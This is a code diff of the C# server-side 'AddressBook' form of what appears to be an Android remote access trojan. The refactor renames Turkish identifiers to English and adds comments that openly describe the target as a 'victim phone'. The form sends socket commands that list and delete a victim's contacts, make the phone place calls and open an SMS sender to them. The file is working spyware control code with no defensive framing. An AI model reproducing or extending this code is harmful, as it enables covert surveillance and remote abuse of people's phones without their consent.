@@ -4,62 +4,89 @@ using System.Windows.Forms;
 
 namespace Server.Views
 {
+    /// <summary>
+    /// Shows the contacts of victim phone
+    /// </summary>
     public partial class AddressBook : Form
     {
-        Socket socket;
+        readonly Socket socket;
         public string Id = "";
+
         /// <summary>
         /// Creates a new <see cref="AddressBook"/> instance
         /// </summary>
-        /// <param name="socket"></param>
-        /// <param name="id"></param>
+        /// <param name="socket">Socket that connects the client to the server</param>
+        /// <param name="id">Identification of the client</param>
         public AddressBook(Socket socket, string id)
         {
             InitializeComponent();
             Id = id; this.socket = socket;
         }
-        public void bilgileriIsle(string arg)
+
+        /// <summary>
+        /// Fetch contacts on mobile phone from a command
+        /// </summary>
+        /// <param name="arg">Command arguments</param>
+        public void FetchContacts(string arg)
         {
-            listView1.Items.Clear();
+            contacts.Items.Clear();
             if (arg != "REHBER YOK")
             {
-                string[] ana_Veriler = arg.Split('&');
-                for (int k = 0; k < ana_Veriler.Length; k++)
+                string[] mainData = arg.Split('&');
+                for (int k = 0; k < mainData.Length; k++)
                 {
                     try
                     {
-                        string[] bilgiler = ana_Veriler[k].Split('=');
-                        ListViewItem item = new ListViewItem(bilgiler[0]);
-                        item.ImageIndex = 0;
-                        item.SubItems.Add(bilgiler[1]);
-                        listView1.Items.Add(item);
+                        string[] info = mainData[k].Split('=');
+                        ListViewItem item = new ListViewItem(info[0])
+                        {
+                            ImageIndex = 0
+                        };
+                        item.SubItems.Add(info[1]);
+                        contacts.Items.Add(item);
                     }
                     catch (Exception) { }
                 }
             }
             else
             {
-                ListViewItem item = new ListViewItem("Rehber Yok.");
-                listView1.Items.Add(item);
+                ListViewItem item = new ListViewItem("No Contacts");
+                contacts.Items.Add(item);
             }
         }
-        private void ekleToolStripMenuItem_Click(object sender, EventArgs e)
+
+        /// <summary>
+        /// Adds a new contact to mobile phone
+        /// </summary>
+        /// <param name="sender"><see cref="AddressBook"/> instance</param>
+        /// <param name="e"><see cref="EnventArgs"/></param>
+        private void OnAddContact(object sender, EventArgs e)
         {
             new AddContact(socket).Show();
         }
 
-        private void silToolStripMenuItem_Click(object sender, EventArgs e)
+        /// <summary>
+        /// Removes a contact from mobile phone
+        /// </summary>
+        /// <param name="sender"><see cref="AddressBook"/> instance</param>
+        /// <param name="e"><see cref="EnventArgs"/></param>
+        private void OnRemoveContact(object sender, EventArgs e)
         {
             try
             {
-                MainWindow.GoToOurSocket("REHBERSIL", "[VERI]" + listView1.SelectedItems[0].Text + "[VERI][0x09]", socket);
-                listView1.SelectedItems[0].Remove();
-                Text = "Adress Book";
+                MainWindow.GoToOurSocket("REHBERSIL", $"[VERI]{contacts.SelectedItems[0].Text}[VERI][0x09]", socket);
+                contacts.SelectedItems[0].Remove();
+                Text = "Address Book";
             }
             catch (Exception) { }
         }
 
-        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
+        /// <summary>
+        /// Refresh the actual form
+        /// </summary>
+        /// <param name="sender"><see cref="AddressBook"/> instance</param>
+        /// <param name="e"><see cref="EnventArgs"/></param>
+        private void OnRefreshForm(object sender, EventArgs e)
         {
             try
             {
@@ -69,33 +96,76 @@ namespace Server.Views
             catch (Exception) { }
         }
 
-        private void araToolStripMenuItem_Click(object sender, EventArgs e)
+        /// <summary>
+        /// Calls to a contact from the mobile phone
+        /// </summary>
+        /// <param name="sender"><see cref="AddressBook"/> instance</param>
+        /// <param name="e"><see cref="EnventArgs"/></param>
+        private void OnCallContact(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count == 1)
+            if (contacts.SelectedItems.Count == 1)
             {
                 try
                 {
-                    MainWindow.GoToOurSocket("ARA", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", socket);
-                    MessageBox.Show("Arama talimatı gönderildi.", "Arama", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    MainWindow.GoToOurSocket("ARA", $"[VERI]{contacts.SelectedItems[0].SubItems[1].Text}[VERI][0x09]", socket);
+                    MessageBox.Show("Call instruction has been sent.", "Call", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
                 }
                 catch (Exception) { }
             }
         }
 
-        private void smsToolStripMenuItem_Click(object sender, EventArgs e)
+        /// <summary>
+        /// Send SMS to a contact from the mobile phone
+        /// </summary>
+        /// <param name="sender"><see cref="AddressBook"/> instance</param>
+        /// <param name="e"><see cref="EnventArgs"/></param>
+        private void OnSendSMS(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count == 1)
+            if (contacts.SelectedItems.Count == 1)
             {
-                new SMS(socket, listView1.SelectedItems[0].SubItems[1].Text).Show();
+                new SMS(socket, contacts.SelectedItems[0].SubItems[1].Text).Show();
+            }
+            else if (contacts.SelectedItems.Count == 0)
+            {
+                MessageBox.Show("Select one contact to send SMS",
+                                "Select one contact",
+                                MessageBoxButtons.OK,
+                                MessageBoxIcon.Information);
+            }
+            else
+            {
+                MessageBox.Show("Select only one contact to send SMS",
+                                "Can't send SMS",
+                                MessageBoxButtons.OK,
+                                MessageBoxIcon.Information);
             }
         }
 
-        private void kopyalaToolStripMenuItem_Click(object sender, EventArgs e)
+        /// <summary>
+        /// Copy the contact to a later usage
+        /// </summary>
+        /// <param name="sender"><see cref="AddressBook"/> instance</param>
+        /// <param name="e"><see cref="EnventArgs"/></param>
+        private void OnCopyButtonClicked(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count == 1)
+            if (contacts.SelectedItems.Count == 1)
             {
-                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
+                Clipboard.SetText(contacts.SelectedItems[0].SubItems[1].Text);
+            }
+            else if (contacts.SelectedItems.Count == 0)
+            {
+                MessageBox.Show("Select one contact to copy",
+                                "Select one contact",
+                                MessageBoxButtons.OK,
+                                MessageBoxIcon.Information);
+            }
+            else
+            {
+                MessageBox.Show("Select only one contact to copy",
+                                "Can't copy contacts",
+                                MessageBoxButtons.OK,
+                                MessageBoxIcon.Information);
             }
         }
     }
